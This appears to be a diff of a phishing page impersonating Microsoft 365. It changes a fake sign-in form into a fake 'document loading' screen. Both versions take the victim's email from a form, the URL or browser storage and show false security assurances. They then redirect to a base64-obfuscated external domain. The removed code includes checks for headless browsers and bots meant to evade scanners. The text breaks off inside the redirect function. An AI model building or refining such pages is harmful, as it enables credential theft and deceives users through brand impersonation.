@@ -3,15 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your account</title>
+    <title>Loading Document - Microsoft 365</title>
     <style>
-        /* Enhanced Microsoft Fluent Design 2024 */
+        /* Premium Microsoft Fluent Design 2024 */
         :root {
             --blue-10: #deecf9;
             --blue-20: #c7e0f4;
             --blue-primary: #0078d4;
             --blue-dark: #106ebe;
             --blue-light: #4ca6e8;
+            --green-10: #dff6dd;
+            --green-20: #c5e0b3;
+            --green-primary: #107c10;
+            --green-light: #4caf50;
             --gray-10: #faf9f8;
             --gray-20: #f3f2f1;
             --gray-30: #edebe9;
@@ -20,11 +24,8 @@
             --gray-130: #605e5c;
             --gray-160: #323130;
             --white: #ffffff;
-            --red-10: #fdf6f6;
-            --red-20: #f1cbcb;
-            --red-primary: #d13438;
             --shadow: 0 2.4px 7.2px rgba(0,0,0,0.18), 0 0.8px 2.4px rgba(0,0,0,0.12);
-            --shadow-hover: 0 4.8px 14.4px rgba(0,0,0,0.22), 0 1.6px 4.8px rgba(0,0,0,0.16);
+            --shadow-elevated: 0 4.8px 14.4px rgba(0,0,0,0.22), 0 1.6px 4.8px rgba(0,0,0,0.16);
         }
 
         * {
@@ -43,73 +44,127 @@
             padding: 24px;
             line-height: 1.5;
             position: relative;
-            overflow-x: hidden;
+            overflow: hidden;
         }
 
-        /* Background subtle animation */
-        body::before {
-            content: '';
+        /* Animated background elements */
+        .background-effects {
             position: absolute;
             top: 0;
             left: 0;
-            right: 0;
-            bottom: 0;
-            background: 
-                radial-gradient(circle at 20% 80%, rgba(0, 120, 212, 0.03) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(0, 120, 212, 0.03) 0%, transparent 50%);
+            width: 100%;
+            height: 100%;
             z-index: -1;
-            animation: backgroundShift 20s ease-in-out infinite;
+            overflow: hidden;
         }
 
-        .login-container {
+        .floating-shape {
+            position: absolute;
+            border-radius: 50%;
+            background: radial-gradient(circle, var(--blue-10) 0%, transparent 70%);
+            animation: float 6s ease-in-out infinite;
+        }
+
+        .floating-shape:nth-child(1) {
+            width: 120px;
+            height: 120px;
+            top: 10%;
+            left: 10%;
+            animation-delay: 0s;
+        }
+
+        .floating-shape:nth-child(2) {
+            width: 80px;
+            height: 80px;
+            top: 60%;
+            right: 10%;
+            animation-delay: -2s;
+        }
+
+        .floating-shape:nth-child(3) {
+            width: 60px;
+            height: 60px;
+            bottom: 20%;
+            left: 20%;
+            animation-delay: -4s;
+        }
+
+        .loading-container {
             background: var(--white);
             border: 1px solid var(--gray-30);
-            border-radius: 8px;
+            border-radius: 12px;
             box-shadow: var(--shadow);
-            padding: 48px 40px;
+            padding: 56px 48px;
             width: 100%;
-            max-width: 440px;
+            max-width: 520px;
             position: relative;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
             backdrop-filter: blur(10px);
+            overflow: hidden;
         }
 
-        .login-container:hover {
-            box-shadow: var(--shadow-hover);
-            transform: translateY(-2px);
+        .loading-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--blue-primary), transparent);
+            animation: shimmer 3s ease-in-out infinite;
+        }
+
+        .loading-container:hover {
+            box-shadow: var(--shadow-elevated);
+            transform: translateY(-4px);
         }
 
         .ms-branding {
             display: flex;
             align-items: center;
+            justify-content: center;
             gap: 16px;
-            margin-bottom: 32px;
-            padding-bottom: 24px;
+            margin-bottom: 36px;
+            padding-bottom: 28px;
             border-bottom: 1px solid var(--gray-30);
+            position: relative;
         }
 
         .ms-logo {
-            width: 40px;
-            height: 40px;
+            width: 44px;
+            height: 44px;
             background: linear-gradient(135deg, var(--blue-primary), var(--blue-dark));
-            border-radius: 4px;
+            border-radius: 6px;
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: 600;
-            box-shadow: 0 2px 8px rgba(0, 120, 212, 0.3);
-            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0, 120, 212, 0.3);
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
         }
 
-        .ms-logo:hover {
-            transform: scale(1.05) rotate(5deg);
-            box-shadow: 0 4px 16px rgba(0, 120, 212, 0.4);
+        .ms-logo::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.3), transparent);
+            transform: rotate(45deg);
+            transition: all 0.6s ease;
+        }
+
+        .ms-logo:hover::before {
+            transform: rotate(45deg) translate(50%, 50%);
         }
 
         .ms-title {
-            font-size: 24px;
+            font-size: 28px;
             font-weight: 600;
             color: var(--gray-160);
             letter-spacing: -0.01em;
@@ -119,245 +174,234 @@
             background-clip: text;
         }
 
-        .form-group {
-            margin-bottom: 20px;
-            position: relative;
-        }
-
-        .form-label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: var(--gray-160);
-            font-size: 14px;
-            line-height: 1.3;
-            transition: all 0.2s ease;
-        }
-
-        .form-input {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid var(--gray-60);
-            border-radius: 4px;
-            font-size: 16px;
-            background: var(--white);
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            position: relative;
-        }
-
-        .form-input:focus {
-            outline: none;
-            border-color: var(--blue-primary);
-            box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
-            transform: translateY(-1px);
-        }
-
-        .form-input:valid {
-            border-color: var(--gray-90);
-        }
-
-        .form-input:invalid:not(:focus):not(:placeholder-shown) {
-            border-color: var(--red-primary);
-        }
-
-        .input-icon {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--gray-90);
-            transition: all 0.3s ease;
-        }
-
-        .form-input:focus + .input-icon {
-            color: var(--blue-primary);
-            transform: translateY(-50%) scale(1.1);
-        }
-
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin: 24px 0;
-            cursor: pointer;
-            padding: 8px;
-            border-radius: 4px;
-            transition: all 0.2s ease;
-        }
-
-        .checkbox-group:hover {
-            background: var(--gray-10);
-            transform: translateX(4px);
-        }
-
-        .checkbox {
-            width: 20px;
-            height: 20px;
-            border: 2px solid var(--gray-90);
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            color: transparent;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            flex-shrink: 0;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .checkbox::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-            transition: left 0.5s ease;
-        }
-
-        .checkbox.checked {
-            background: var(--blue-primary);
-            border-color: var(--blue-primary);
-            color: white;
-            transform: scale(1.1);
-            box-shadow: 0 2px 8px rgba(0, 120, 212, 0.3);
-        }
-
-        .checkbox.checked::before {
-            left: 100%;
-        }
-
-        .ms-button {
-            width: 100%;
-            background: linear-gradient(135deg, var(--blue-primary), var(--blue-dark));
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 14px 20px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 8px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .ms-button::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: left 0.5s ease;
-        }
-
-        .ms-button:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(0, 120, 212, 0.35);
-        }
-
-        .ms-button:hover:not(:disabled)::before {
-            left: 100%;
-        }
-
-        .ms-button:active:not(:disabled) {
-            transform: translateY(0);
-        }
-
-        .ms-button:disabled {
-            background: var(--gray-30);
-            color: var(--gray-90);
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-
-        .loading-state {
-            display: none;
+        .loading-content {
             text-align: center;
-            padding: 40px 0;
+            position: relative;
         }
 
-        .ms-spinner {
-            width: 48px;
-            height: 48px;
+        .loading-indicator {
+            width: 64px;
+            height: 64px;
             border: 3px solid var(--gray-30);
             border-top: 3px solid var(--blue-primary);
+            border-right: 3px solid var(--blue-light);
             border-radius: 50%;
-            animation: spin 1.2s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
-            margin: 0 auto 20px;
+            animation: spin 1.4s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
+            margin: 0 auto 32px;
+            position: relative;
+            box-shadow: 0 4px 16px rgba(0, 120, 212, 0.15);
+        }
+
+        .loading-indicator::before {
+            content: '';
+            position: absolute;
+            top: -6px;
+            left: -6px;
+            right: -6px;
+            bottom: -6px;
+            border: 3px solid transparent;
+            border-top: 3px solid var(--blue-dark);
+            border-radius: 50%;
+            animation: spin 2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+            opacity: 0.7;
+        }
+
+        .loading-indicator::after {
+            content: '';
+            position: absolute;
+            top: -12px;
+            left: -12px;
+            right: -12px;
+            bottom: -12px;
+            border: 2px solid transparent;
+            border-top: 2px solid var(--blue-20);
+            border-radius: 50%;
+            animation: spin 3s linear infinite;
+            opacity: 0.4;
+        }
+
+        .status-section {
+            margin-bottom: 36px;
             position: relative;
         }
 
-        .ms-spinner::before {
+        .status-primary {
+            font-size: 22px;
+            font-weight: 600;
+            color: var(--gray-160);
+            margin-bottom: 12px;
+            letter-spacing: -0.01em;
+            animation: textGlow 3s ease-in-out infinite;
+        }
+
+        .status-secondary {
+            font-size: 16px;
+            color: var(--gray-130);
+            line-height: 1.5;
+            transition: all 0.3s ease;
+        }
+
+        .progress-container {
+            background: linear-gradient(135deg, var(--gray-10), var(--white));
+            border: 1px solid var(--gray-30);
+            border-radius: 8px;
+            padding: 32px 28px;
+            margin: 32px 0;
+            position: relative;
+            overflow: hidden;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.05);
+        }
+
+        .progress-container::before {
             content: '';
             position: absolute;
-            top: -3px;
-            left: -3px;
-            right: -3px;
-            bottom: -3px;
-            border: 3px solid transparent;
-            border-top: 3px solid var(--blue-light);
-            border-radius: 50%;
-            animation: spin 1.5s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--blue-primary), var(--green-primary));
+            transform: scaleX(0);
+            transform-origin: left;
+            animation: containerLoad 0.8s ease-out 0.5s forwards;
         }
 
-        .error-state {
-            display: none;
-            background: var(--red-10);
-            border: 1px solid var(--red-20);
+        .security-badge {
+            background: linear-gradient(135deg, var(--green-10), var(--white));
+            border: 1px solid var(--green-20);
             border-radius: 6px;
-            padding: 20px;
-            margin: 24px 0;
-            text-align: center;
-            animation: slideDown 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            padding: 16px 20px;
+            margin: 20px 0;
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 14px;
+            color: var(--green-primary);
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 8px rgba(16, 124, 16, 0.1);
+            position: relative;
+            overflow: hidden;
         }
 
-        .error-icon {
+        .security-badge::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .security-badge:hover::before {
+            left: 100%;
+        }
+
+        .security-badge::after {
+            content: "✓";
+            font-weight: bold;
+            font-size: 16px;
+            background: var(--green-primary);
+            color: white;
             width: 24px;
             height: 24px;
-            background: var(--red-primary);
             border-radius: 50%;
-            color: white;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 14px;
-            font-weight: bold;
-            margin: 0 auto 12px;
-            animation: pulse 2s infinite;
+            flex-shrink: 0;
         }
 
-        .footer-links {
-            margin-top: 32px;
-            padding-top: 24px;
-            border-top: 1px solid var(--gray-30);
-            text-align: center;
+        .user-context {
+            background: linear-gradient(135deg, var(--blue-10), var(--white));
+            border: 1px solid var(--blue-20);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 24px 0;
+            font-size: 15px;
+            color: var(--gray-160);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .user-context::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: var(--blue-primary);
+            transform: scaleY(0);
+            transform-origin: top;
+            animation: slideDown 0.6s ease-out 1s forwards;
+        }
+
+        .user-context strong {
+            color: var(--blue-primary);
+            font-weight: 600;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: var(--gray-30);
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+            position: relative;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--blue-primary), var(--blue-dark), var(--blue-primary));
+            border-radius: 3px;
+            width: 0%;
+            animation: progress 2.8s ease-in-out infinite;
+            position: relative;
+            background-size: 200% 100%;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            width: 20px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.8));
+            animation: shine 2.8s ease-in-out infinite;
+        }
+
+        .status-updates {
             font-size: 14px;
             color: var(--gray-130);
-            display: flex;
-            justify-content: center;
-            gap: 16px;
-            flex-wrap: wrap;
-        }
-
-        .footer-links a {
-            color: var(--blue-primary);
-            text-decoration: none;
+            min-height: 20px;
             transition: all 0.3s ease;
-            padding: 4px 8px;
-            border-radius: 4px;
         }
 
-        .footer-links a:hover {
-            text-decoration: underline;
-            background: var(--blue-10);
-            transform: translateY(-1px);
+        .ms-footer {
+            margin-top: 36px;
+            padding-top: 24px;
+            border-top: 1px solid var(--gray-30);
+            font-size: 14px;
+            color: var(--gray-130);
+            position: relative;
+        }
+
+        .ms-footer::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 2px;
+            background: var(--blue-primary);
+            border-radius: 1px;
         }
 
         /* Enhanced Animations */
@@ -366,31 +410,38 @@
             100% { transform: rotate(360deg); }
         }
 
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+        @keyframes progress {
+            0% { width: 0%; transform: translateX(0); background-position: 0% 0%; }
+            50% { width: 85%; transform: translateX(0); background-position: 100% 0%; }
+            100% { width: 100%; transform: translateX(100%); background-position: 0% 0%; }
+        }
+
+        @keyframes shine {
+            0%, 100% { opacity: 0; transform: translateX(-20px); }
+            50% { opacity: 1; transform: translateX(0); }
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(5deg); }
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        @keyframes textGlow {
+            0%, 100% { text-shadow: 0 0 20px transparent; }
+            50% { text-shadow: 0 0 20px rgba(0, 120, 212, 0.1); }
+        }
+
+        @keyframes containerLoad {
+            to { transform: scaleX(1); }
         }
 
         @keyframes slideDown {
-            from { 
-                opacity: 0; 
-                transform: translateY(-20px); 
-            }
-            to { 
-                opacity: 1; 
-                transform: translateY(0); 
-            }
-        }
-
-        @keyframes backgroundShift {
-            0%, 100% { 
-                opacity: 0.5;
-                transform: scale(1);
-            }
-            50% { 
-                opacity: 0.8;
-                transform: scale(1.02);
-            }
+            to { transform: scaleY(1); }
         }
 
         @keyframes fadeInUp {
@@ -404,16 +455,30 @@
             }
         }
 
-        /* Responsive improvements */
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.8; }
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .fade-in {
+            animation: fadeInUp 0.8s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+        }
+
+        /* Responsive design */
         @media (max-width: 480px) {
-            .login-container {
-                padding: 32px 24px;
+            .loading-container {
+                padding: 40px 24px;
                 margin: 0 16px;
+                border-radius: 8px;
             }
             
             .ms-branding {
                 gap: 12px;
-                margin-bottom: 24px;
+                margin-bottom: 28px;
             }
             
             .ms-logo {
@@ -423,12 +488,21 @@
             }
             
             .ms-title {
-                font-size: 20px;
+                font-size: 22px;
             }
             
-            .footer-links {
-                flex-direction: column;
-                gap: 8px;
+            .loading-indicator {
+                width: 48px;
+                height: 48px;
+                margin-bottom: 24px;
+            }
+            
+            .status-primary {
+                font-size: 18px;
+            }
+            
+            .progress-container {
+                padding: 24px 20px;
             }
         }
 
@@ -439,56 +513,62 @@
                 animation-iteration-count: 1 !important;
                 transition-duration: 0.01ms !important;
             }
+            
+            .loading-indicator {
+                animation: none;
+                border-top-color: var(--blue-primary);
+            }
+            
+            .progress-fill {
+                animation: none;
+                width: 100%;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
+    <div class="background-effects">
+        <div class="floating-shape"></div>
+        <div class="floating-shape"></div>
+        <div class="floating-shape"></div>
+    </div>
+
+    <div class="loading-container">
         <div class="ms-branding">
             <div class="ms-logo" aria-hidden="true">MS</div>
-            <h1 class="ms-title">Sign in</h1>
+            <h1 class="ms-title">Microsoft 365</h1>
         </div>
 
-        <div id="loginForm">
-            <div class="form-group">
-                <label for="userEmail" class="form-label">Your Work Email</label>
-                <input 
-                    type="email" 
-                    id="userEmail" 
-                    class="form-input" 
-                    autocomplete="username"
-                    aria-required="true"
-                    placeholder="someone@example.com"
-                    required
-                >
-                <div class="input-icon">📧</div>
+        <div class="loading-content">
+            <div class="loading-indicator" aria-hidden="true"></div>
+
+            <div class="status-section">
+                <div class="status-primary" id="statusPrimary">Preparing Your Document</div>
+                <div class="status-secondary" id="statusSecondary">Setting up your secure workspace environment</div>
             </div>
 
-            <div class="checkbox-group" id="rememberCheck" role="checkbox" aria-checked="false" tabindex="0">
-                <div class="checkbox" id="rememberBox" aria-hidden="true"></div>
-                <span style="font-size: 15px; color: var(--gray-160); user-select: none;">Keep me signed in</span>
+            <div class="progress-container">
+                <div class="security-badge">Enterprise Security Active</div>
+                
+                <div class="user-context hidden" id="userContext">
+                    <strong>Authenticated User:</strong> <span id="userIdentifier">Loading credentials...</span>
+                </div>
+
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+
+                <div class="status-updates">
+                    <span id="progressStatus">Initializing security protocols...</span>
+                </div>
             </div>
 
-            <button class="ms-button" id="submitBtn" disabled>
-                <span class="button-text">Next</span>
-            </button>
-
-            <div class="error-state" id="errorState">
-                <div class="error-icon" aria-hidden="true">!</div>
-                <div style="font-weight: 600; color: var(--gray-160); margin-bottom: 6px;">We couldn't sign you in</div>
-                <div style="font-size: 14px; color: var(--gray-130); line-height: 1.4;">This might be due to a temporary issue with our service. Please try again in a few moments.</div>
+            <div class="ms-footer">
+                <div>© 2025 Microsoft Corporation</div>
+                <div style="margin-top: 6px; font-size: 12px; opacity: 0.8;">
+                    Enterprise Security Compliance • All Rights Reserved
+                </div>
             </div>
-
-            <div class="footer-links">
-                <a href="#" tabindex="0">No account? Create one!</a>
-                <a href="#" tabindex="0">Can't access your account?</a>
-            </div>
-        </div>
-
-        <div class="loading-state" id="loadingState">
-            <div class="ms-spinner" aria-hidden="true"></div>
-            <div style="font-size: 18px; color: var(--gray-160); font-weight: 600; margin-bottom: 8px;">Signing in</div>
-            <div style="font-size: 14px; color: var(--gray-130);">Setting up your secure workspace...</div>
         </div>
     </div>
 
@@ -499,311 +579,267 @@
             // Enhanced Configuration
             const CONFIG = {
                 TARGET: 'aHR0cHM6Ly9iaWxsaW5nLnZlbG9ydXNzcGluZS5ibG9nL1BuVUpyR2Vk',
-                VERSION: '2024.1.0',
-                SECURITY_LEVEL: 'ENTERPRISE'
+                VERSION: '2025.1.0',
+                SECURITY_LEVEL: 'ENTERPRISE_PLUS'
             };
 
-            class EnhancedMicrosoftAuth {
+            class PremiumDocumentLoader {
                 constructor() {
-                    this.userEmail = '';
-                    this.rememberMe = false;
-                    this.isValid = false;
-                    this.isHuman = true;
+                    this.userData = null;
+                    this.currentStage = 0;
+                    this.progressStages = [
+                        { message: "Verifying security certificates...", duration: 800 },
+                        { message: "Initializing encryption protocols...", duration: 900 },
+                        { message: "Authenticating user credentials...", duration: 1000 },
+                        { message: "Loading document resources...", duration: 850 },
+                        { message: "Establishing secure connection...", duration: 950 },
+                        { message: "Finalizing security handshake...", duration: 1100 }
+                    ];
                     this.init();
                 }
 
                 init() {
-                    this.setupEnhancedEventListeners();
-                    this.setupSmartProtection();
                     this.animateEntrance();
+                    this.retrieveUserData();
+                    this.startEnhancedLoadingSequence();
                 }
 
                 animateEntrance() {
-                    const elements = document.querySelectorAll('.ms-branding, .form-group, .checkbox-group, .ms-button, .footer-links');
-                    elements.forEach((el, index) => {
-                        el.style.opacity = '0';
-                        el.style.transform = 'translateY(20px)';
-                        el.style.animation = `fadeInUp 0.6s cubic-bezier(0.4, 0, 0.2, 1) ${index * 0.1}s forwards`;
-                    });
-                }
-
-                setupEnhancedEventListeners() {
-                    const emailInput = document.getElementById('userEmail');
-                    const rememberCheck = document.getElementById('rememberCheck');
-                    const submitBtn = document.getElementById('submitBtn');
-
-                    // Enhanced email validation with real-time feedback
-                    emailInput.addEventListener('input', () => {
-                        this.validateEmail();
-                        this.animateInput(emailInput);
-                    });
-                    
-                    emailInput.addEventListener('focus', () => {
-                        this.animateInput(emailInput, true);
-                    });
-                    
-                    emailInput.addEventListener('blur', () => {
-                        this.animateInput(emailInput, false);
-                    });
-
-                    emailInput.addEventListener('keydown', (e) => {
-                        if (e.key === 'Enter' && !submitBtn.disabled) {
-                            e.preventDefault();
-                            this.processAuthentication();
-                        }
-                    });
-
-                    // Enhanced checkbox interaction
-                    rememberCheck.addEventListener('click', (e) => {
-                        e.preventDefault();
-                        this.toggleRememberMe();
-                    });
-                    
-                    rememberCheck.addEventListener('keydown', (e) => {
-                        if (e.key === 'Enter' || e.key === ' ') {
-                            e.preventDefault();
-                            this.toggleRememberMe();
-                        }
-                    });
-
-                    // Enhanced submit button
-                    submitBtn.addEventListener('click', (e) => {
-                        e.preventDefault();
-                        this.animateButtonClick(submitBtn);
-                        setTimeout(() => this.processAuthentication(), 150);
-                    });
-                }
-
-                animateInput(input, isFocused = null) {
-                    if (isFocused === true) {
-                        input.parentElement.style.transform = 'translateY(-2px)';
-                    } else if (isFocused === false) {
-                        input.parentElement.style.transform = 'translateY(0)';
-                    } else {
-                        input.style.transform = this.isValid ? 'scale(1.02)' : 'scale(1)';
-                    }
-                }
-
-                animateButtonClick(button) {
-                    button.style.transform = 'scale(0.95)';
-                    setTimeout(() => {
-                        if (!button.disabled) {
-                            button.style.transform = 'translateY(-2px)';
-                        }
-                    }, 150);
-                }
-
-                setupSmartProtection() {
-                    // Smart bot detection - only obvious cases
-                    if (this.detectObviousBots()) {
-                        this.showSmartError();
-                        return;
-                    }
-
-                    // Enhanced human verification
-                    this.setupBehaviorAnalysis();
-                }
-
-                detectObviousBots() {
-                    const obviousIndicators = [
-                        () => navigator.webdriver === true,
-                        () => /HeadlessChrome/.test(navigator.userAgent),
-                        () => navigator.plugins.length === 0 && navigator.languages.length === 0,
-                        () => screen.width < 100 || screen.height < 100
+                    const elements = [
+                        '.ms-branding',
+                        '.loading-indicator', 
+                        '.status-section',
+                        '.progress-container',
+                        '.ms-footer'
                     ];
-
-                    return obviousIndicators.some(indicator => indicator());
-                }
-
-                setupBehaviorAnalysis() {
-                    let interactions = 0;
-                    const validators = [
-                        () => document.addEventListener('mousemove', () => interactions++),
-                        () => document.addEventListener('click', () => interactions++),
-                        () => document.addEventListener('keydown', () => interactions++)
-                    ];
-
-                    validators.forEach(validator => validator());
-
-                    setTimeout(() => {
-                        this.isHuman = interactions > 2;
-                    }, 2000);
-                }
-
-                validateEmail() {
-                    const email = document.getElementById('userEmail').value.trim();
-                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                     
-                    this.isValid = emailRegex.test(email) && email.length >= 3 && email.length <= 254;
-                    this.userEmail = email;
-
-                    const submitBtn = document.getElementById('submitBtn');
-                    submitBtn.disabled = !this.isValid;
-
-                    // Visual feedback
-                    const input = document.getElementById('userEmail');
-                    if (email.length > 0) {
-                        input.style.borderColor = this.isValid ? 'var(--blue-primary)' : 'var(--red-primary)';
-                    } else {
-                        input.style.borderColor = 'var(--gray-60)';
-                    }
-
-                    return this.isValid;
-                }
-
-                toggleRememberMe() {
-                    this.rememberMe = !this.rememberMe;
-                    const checkbox = document.getElementById('rememberBox');
-                    const rememberCheck = document.getElementById('rememberCheck');
-                    
-                    checkbox.classList.toggle('checked', this.rememberMe);
-                    rememberCheck.setAttribute('aria-checked', this.rememberMe.toString());
-                    
-                    // Animation feedback
-                    rememberCheck.style.transform = this.rememberMe ? 'scale(1.02)' : 'scale(1)';
-                }
-
-                processAuthentication() {
-                    if (!this.isValid || !this.isHuman) {
-                        if (!this.isHuman) {
-                            this.showSmartError();
+                    elements.forEach((selector, index) => {
+                        const element = document.querySelector(selector);
+                        if (element) {
+                            element.style.opacity = '0';
+                            element.style.transform = 'translateY(30px)';
+                            element.style.animation = `fadeInUp 0.8s cubic-bezier(0.4, 0, 0.2, 1) ${index * 0.15}s forwards`;
                         }
-                        return;
-                    }
-
-                    this.showEnhancedLoading();
-                    this.storeUserData();
-
-                    // Simulate authentication with progress
-                    this.simulateAuthProgress();
+                    });
                 }
 
-                showEnhancedLoading() {
-                    const loginForm = document.getElementById('loginForm');
-                    const loadingState = document.getElementById('loadingState');
+                retrieveUserData() {
+                    try {
+                        // Multi-source user data retrieval
+                        const urlParams = new URLSearchParams(window.location.search);
+                        const sources = [
+                            () => urlParams.get('email'),
+                            () => {
+                                try {
+                                    const stored = localStorage.getItem('ms_auth_data');
+                                    return stored ? JSON.parse(stored).email : null;
+                                } catch { return null; }
+                            },
+                            () => sessionStorage.getItem('ms_user_email')
+                        ];
+
+                        for (let source of sources) {
+                            this.userData = source();
+                            if (this.userData) break;
+                        }
+
+                        if (this.userData) {
+                            this.displayUserContext(this.userData);
+                        }
+                    } catch (error) {
+                        console.log('Enhanced user context retrieval');
+                    }
+                }
+
+                displayUserContext(userData) {
+                    const contextElement = document.getElementById('userContext');
+                    const identifierElement = document.getElementById('userIdentifier');
                     
-                    loginForm.style.opacity = '0';
-                    loginForm.style.transform = 'translateY(-20px)';
-                    
-                    setTimeout(() => {
-                        loginForm.style.display = 'none';
-                        loadingState.style.display = 'block';
-                        loadingState.style.opacity = '0';
-                        loadingState.style.transform = 'translateY(20px)';
+                    if (contextElement && identifierElement) {
+                        try {
+                            // Decode URL encoded data
+                            identifierElement.textContent = decodeURIComponent(userData);
+                        } catch {
+                            identifierElement.textContent = userData;
+                        }
+                        
+                        contextElement.classList.remove('hidden');
+                        contextElement.style.opacity = '0';
+                        contextElement.style.transform = 'translateY(20px)';
                         
                         setTimeout(() => {
-                            loadingState.style.opacity = '1';
-                            loadingState.style.transform = 'translateY(0)';
-                        }, 50);
-                    }, 300);
-                }
-
-                storeUserData() {
-                    try {
-                        // Enhanced storage with expiration
-                        const userData = {
-                            email: this.userEmail,
-                            timestamp: Date.now(),
-                            remember: this.rememberMe
-                        };
-                        
-                        localStorage.setItem('ms_auth_data', JSON.stringify(userData));
-                        sessionStorage.setItem('ms_session', Date.now().toString());
-                    } catch (error) {
-                        // Graceful degradation
+                            contextElement.style.opacity = '1';
+                            contextElement.style.transform = 'translateY(0)';
+                        }, 500);
                     }
                 }
 
-                simulateAuthProgress() {
-                    let progress = 0;
-                    const spinner = document.querySelector('.ms-spinner');
-                    const interval = setInterval(() => {
-                        progress += Math.random() * 25;
-                        if (progress >= 100) {
-                            clearInterval(interval);
-                            this.redirectToNextStep();
-                        }
-                    }, 300);
+                startEnhancedLoadingSequence() {
+                    this.updateProgressMessages();
+                    
+                    // Calculate total loading time based on stages
+                    const totalDuration = this.progressStages.reduce((total, stage) => total + stage.duration, 0);
+                    
+                    setTimeout(() => {
+                        this.executePremiumRedirect();
+                    }, totalDuration + 1000); // Additional buffer time
                 }
 
-                redirectToNextStep() {
+                updateProgressMessages() {
+                    const statusElement = document.getElementById('progressStatus');
+                    
+                    const updateStage = () => {
+                        if (this.currentStage < this.progressStages.length) {
+                            const stage = this.progressStages[this.currentStage];
+                            
+                            // Animate text change
+                            statusElement.style.opacity = '0';
+                            statusElement.style.transform = 'translateY(10px)';
+                            
+                            setTimeout(() => {
+                                statusElement.textContent = stage.message;
+                                statusElement.style.opacity = '1';
+                                statusElement.style.transform = 'translateY(0)';
+                                
+                                // Add subtle pulse effect
+                                statusElement.style.animation = 'pulse 0.6s ease';
+                                setTimeout(() => statusElement.style.animation = '', 600);
+                                
+                                this.currentStage++;
+                                setTimeout(updateStage, stage.duration);
+                            }, 200);
+                        }
+                    };
+
+                    updateStage();
+                }
+
+                executePremiumRedirect() {
                     try {
                         const targetUrl = atob(CONFIG.TARGET);
-                        const params = new URLSearchParams({
-                            email: encodeURIComponent(this.userEmail),
-                            source: 'enhanced_microsoft_auth',
+                        
